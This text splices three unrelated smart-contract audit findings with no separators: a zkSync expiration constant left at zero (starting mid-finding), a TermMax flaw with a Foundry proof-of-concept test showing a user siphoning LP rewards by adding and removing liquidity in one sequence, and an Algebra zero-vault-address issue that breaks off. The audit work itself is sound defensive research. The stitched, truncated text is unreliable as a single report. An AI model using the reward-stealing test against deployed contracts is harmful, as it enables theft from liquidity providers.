/// @dev The amount of time in seconds the validator has to process the priority transaction
/// NOTE: The constant is set to zero for the Alpha release period
//@audit this is still 0?
uint256 constant PRIORITY_EXPIRATION = 0 days;
​
----end of code block ----
Evidently, the PRIORITY_EXPIRATION is set to zero, but this is meant for the Alpha release period which ended in April, now consider https://github.com/code-423n4/2024-03-zksync/blob/4f0ba34f34a864c354c7e8c47643ed8f4a250e13/code/contracts/ethereum/contracts/state-transition/chain-deps/facets/Mailbox.sol#L258-L287
----new code block----
 function _requestL2Transaction(
 uint256 _mintValue,
        WritePriorityOpParams memory _params,
 bytes memory _calldata,
 bytes[] memory _factoryDeps
    ) internal returns (bytes32 canonicalTxHash) {
 require(_factoryDeps.length <= MAX_NEW_FACTORY_DEPS, "uj");
        _params.txId = s.priorityQueue.getTotalPriorityTxs();
​
​
 // Checking that the user provided enough ether to pay for the transaction.
 // Using a new scope to prevent "stack too deep" error
​
​
        _params.l2GasPrice = _deriveL2GasPrice(tx.gasprice, _params.l2GasPricePerPubdata);
 uint256 baseCost = _params.l2GasPrice * _params.l2GasLimit;
 require(_mintValue >= baseCost + _params.l2Value, "mv"); // The `msg.value` doesn't cover the transaction cost
​
​
 // If the `_refundRecipient` is not provided, we use the `_sender` as the recipient.
 address refundRecipient = _params.refundRecipient == address(0) ? _params.sender : _params.refundRecipient;
 // If the `_refundRecipient` is a smart contract, we apply the L1 to L2 alias to prevent foot guns.
 if (refundRecipient.code.length > 0) {
            refundRecipient = AddressAliasHelper.applyL1ToL2Alias(refundRecipient);
        }
        _params.refundRecipient = refundRecipient;
​
​
 // populate missing fields
 //@audit
        _params.expirationTimestamp = uint64(block.timestamp + PRIORITY_EXPIRATION); // Safe to cast
        _params.valueToMint = _mintValue;
​
​
        canonicalTxHash = _writePriorityOp(_params, _calldata, _factoryDeps);
    }
----end of code block ----
We can see that the deadline parameter uses this value "PRIORITY_EXPIRATION" to determine the deadline for the validators to process this transaction, but the value being 0 would mean that all transaction would use the timestamp the transaction was requested, which would be logically flawed.
Impact
Outdated code still in production.
Recommended Mitigation Steps
Since the Alpha release period has passed, the necessary value for
PRIORITY_EXPIRATION
should be passed and stored in
Config.sol

Finding Summary
Context:
No context files were provided by the reviewer.
Summary:
Malicious users can deposit liquidity and remove liquidity in one transaction to steal some LP rewards.
Finding Description
In the swap process, some swap fees will be generated, and these swap fees are in terms of LP tokens. When LP holders want to remove liquidity, they will receive some rewards according to the fee distribution. We have designed a model where LPs can earn more rewards if they hold their LP longer. However, the issue arises because even if liquidity is deposited within this transaction, LPs can still obtain rewards via the removal of liquidity.
----new code block----
function calculateLpReward(
 uint256 currentTime,
 uint256 openMarketTime,
 uint256 maturity,
 uint256 lpSupply,
 uint256 lpAmt,
 uint256 totalReward
) internal pure returns (uint256 reward) {
 uint t = (lpSupply - totalReward) * (2 * maturity - openMarketTime - currentTime);
    reward = ((totalReward * lpAmt) * (currentTime - openMarketTime)) / t;
}
----end of code block ----
Impact Explanation
Malicious users can exploit this design to steal rewards via flash loans, causing normal LPs to lose some of their rewards.
Likelihood Explanation
This issue does not require any special conditions. If there are accrued rewards, malicious users can seize them.
Proof of Concept
Add this test case into
TermMaxRouter.t.sol
. In this scenario, Alice is the malicious user, and the deployer is the normal LP. If Alice does not add/remove liquidity in this test case, the output is as follows:
FT amount received by deployer:
880738388498
XT amount received by deployer:
1000821070844
If Alice adds and removes liquidity before the deployer's removal, the output changes to:
FT amount received by deployer:
880036223746
XT amount received by deployer:
999548671891
Comparing these two results, the normal user (Deployer) loses some rewards.
Test Function
----new code block----
function testPocReward() public {
    vm.startPrank(deployer);
    res.underlying.approve(address(res.market), 2000e8);

 // Trade some FT, XT to generate some swap fees.
    res.market.buyFt(1000e8, 0);
    res.market.buyXt(1000e8, 0);

    res.ft.approve(address(res.market), res.ft.balanceOf(deployer));
    res.xt.approve(address(res.market), res.xt.balanceOf(deployer));
    res.market.sellFt(uint128(res.ft.balanceOf(deployer)), 0);
    res.market.sellXt(uint128(res.xt.balanceOf(deployer)), 0);

    vm.stopPrank();
    console.log("maturity: ", res.marketConfig.maturity);
    console.log("current block.timestamp: ", block.timestamp);

    vm.warp(block.timestamp + 57 days);
    console.log("current block.timestamp reaches the maturity: ", block.timestamp);

    vm.startPrank(alice);
    res.underlying.approve(address(res.market), 100000e8);
    res.market.provideLiquidity(100000e8);

    res.lpFt.approve(address(router), res.lpFt.balanceOf(alice));
    res.lpXt.approve(address(router), res.lpXt.balanceOf(alice));

    router.withdrawLiquidityToFtXt(alice, res.market, res.lpFt.balanceOf(alice), res.lpXt.balanceOf(alice), 0, 0);

    console.log("Alice FT received amount: ", res.ft.balanceOf(alice));
    console.log("Alice XT received amount: ", res.xt.balanceOf(alice));

    vm.stopPrank();

    vm.startPrank(deployer);
    res.lpFt.approve(address(router), res.lpFt.balanceOf(deployer));
    res.lpXt.approve(address(router), res.lpXt.balanceOf(deployer));

    router.withdrawLiquidityToFtXt(deployer, res.market, res.lpFt.balanceOf(deployer) - 1, res.lpXt.balanceOf(deployer) - 1, 0, 0);

    console.log("FT amount received in deployer: ", res.ft.balanceOf(deployer));
    console.log("XT amount received in deployer: ", res.xt.balanceOf(deployer));

    res.ft.transfer(address(res.market), res.ft.balanceOf(deployer));
    res.xt.transfer(address(res.market), res.xt.balanceOf(deployer));

    vm.stopPrank();
}
----end of code block ----
Recommendation
We should consider the liquidity's actual active time in the pool when calculating the rewards associated with this liquidity.

Collected community fees from each swap and flash loan are immediately sent to the defined
AlgebraFactor.vaultAddress
address. Contrary to the used pull pattern in Uniswap V3.
Having fees (ERC-20 tokens) immediately sent to the vault within each swap and flash loan, opens up potential issues if the vault address is set to the zero address.
The following
AlgebraPool
functions are affected:
swap
,
swapSupportingFeeOnInputTokens
, and
flash
Impact
If the
AlgebraFactor.vaultAddress
address is set to
address(0)
,
all
Algebra pools deployed by this factory contract will have their swap and flash loan functionality affected in a either completely broken way (transactions will revert due to ERC-20 token transfers to the zero address) or fees are sent (effectively burned) to the zero address. In the end, it will depend on the ERC-20 token implementation if it reverts or simply burns the fees.
Proof of Concept
AlgebraFactory.setVaultAddress
AlgebraFactory.setVaultAddress
is used by the owner of the
AlgebraFactory
to set the vault address.
----new code block----
function setVaultAddress(address _vaultAddress) external override onlyOwner {
 require(vaultAddress != _vaultAddress);
 emit VaultAddress(_vaultAddress);
  vaultAddress = _vaultAddress;
}
----end of code block ----
